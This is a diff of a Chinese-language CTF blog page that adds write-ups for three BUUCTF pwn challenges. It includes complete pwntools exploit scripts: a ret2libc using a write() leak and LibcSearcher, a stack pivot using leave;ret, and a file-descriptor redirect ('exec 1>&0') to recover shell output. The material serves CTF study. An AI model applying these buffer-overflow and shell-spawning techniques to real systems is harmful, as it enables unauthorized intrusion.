@@ -63,7 +63,7 @@
                                                总文章数 40
                                 </nav>
                                 <nav>
-	总字数 <span class="post-count">68.7k</span>
+	总字数 <span class="post-count">69.6k</span>
                                 </nav>
 		<nav class="header-smart-menu">
     		
@@ -163,7 +163,7 @@
     
       <header class="article-header">
         <div align="center" class="post-count">
-    字数：2.4k字 | 预计阅读时长：11分钟
+    字数：3.3k字 | 预计阅读时长：15分钟
 </div>
         
   
@@ -420,6 +420,62 @@
 
 <p>成功</p>
 <p><img src="/2024/02/18/buuctf-pwn/image-20240222180124672.png"></p>
+<h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><p><img src="/2024/02/18/buuctf-pwn/image-20240223134352398.png"></p>
+<p>32位程序</p>
+<p>ida看一下</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223155601022.png"></p>
+<p>没有system函数，考虑ret2libc</p>
+<p>看一下偏移</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223160723658.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223160744293.png"></p>
+<p><code>108+4=112</code></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(write_plt) + p32(main_plt) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;XDCTF2015~!\n&quot;</span>,payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(sys_addr) + p32(main_plt) + p32(bin_sh)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;XDCTF2015~!\n&quot;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223161800767.png"></p>
+<h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a>ciscn_2019_s_4</h2><p><img src="/2024/02/18/buuctf-pwn/image-20240223162941626.png"></p>
+<p>ida查看</p>
+<p>漏洞函数</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223163247267.png"></p>
+<p>思路：由于无直接getshell的利用函数，溢出空间只有8字节（ebp+ret占用无法继续填充ROP了），所以需要栈迁移更大的空间来构造ROP。</p>
+<p>查看偏移</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223164109626.png"></p>
+<p>第一个read写入40个字符，覆盖截断暴露ebp地址，第二个read写入rop链并迁移到rop链的起址。</p>
+<p>调试看一下ebp地址和我们输入字符串起址之间的偏移，在read函数下断点并输入bbbb。</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223172837873.png"></p>
+<p>计算ebp的地址和bbbb地址之间的偏移<code>0x38</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223173033348.png"></p>
+<p>查找<code>leave,ret</code></p>
+<p><code>ROPgadget --binary ciscn_s_4 --only &quot;leave|ret&quot;</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223170436645.png"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_4&#x27;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.buuoj.cn&#x27;,25317)</span></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line">system_addr = <span class="number">0x08048400</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">36</span> + <span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">buf_addr = ebp_addr - <span class="number">0x38</span></span><br><span class="line">payload2 = <span class="string">b&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(ebp_addr - <span class="number">0x28</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> <span class="comment">#ebp_addr - 0x28即/bin/sh的地址</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf_addr) + p32(leave_ret)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223175102328.png"></p>
+<h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a>wustctf2020_closed</h2><p><img src="/2024/02/18/buuctf-pwn/image-20240223180038706.png"></p>
+<p>漏洞函数</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223180209031.png"></p>
+<p>存在后门函数</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223180234998.png"></p>
+<p>close（1）关闭了标准输出<br>close（2）关闭了标准错误<br>我们只剩下标准输入，并且看到程序会返回shell（0是标准输入，1是标准输出，2是标准错误）</p>
+<p>主要考察linux重定向问题</p>
+<ul>
+<li>0和1是linux下的文件描述符。</li>
+<li>在Linux中一切皆文件，文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I&#x2F;O操作的系统调用都通过文件描述符。程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。</li>
+<li>标准输入输出的指向是默认的，我们可以修改它们的指向，也即重定位</li>
+<li>举例子，可以用exec 1&gt;myoutput把标准输出重定向到myoutput文件中，也可以用exec 0&lt;myinput把标准输入重定向到myinput文件中，而且，文件名字可以用&amp;+文件描述符来代替。</li>
+<li>那么问题到这里就解决了，三条语句中close(1);close(2)即把标准输出和标准错误输出关闭，然后我们可以执行 exec 1&gt;&amp;0，也就是把标准输出重定向到标准输入，因为默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了</li>
+</ul>
+<p>输入<code>exec 1&gt;&amp;0</code>试一试</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223180722024.png"></p>
+<p>这样就可以看到shell了</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./wustctf2020_closed&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25385</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;arm64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>执行后输入<code>exec 1&gt;&amp;0</code>即可看到shell</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240223181807111.png"></p>
 
       
 
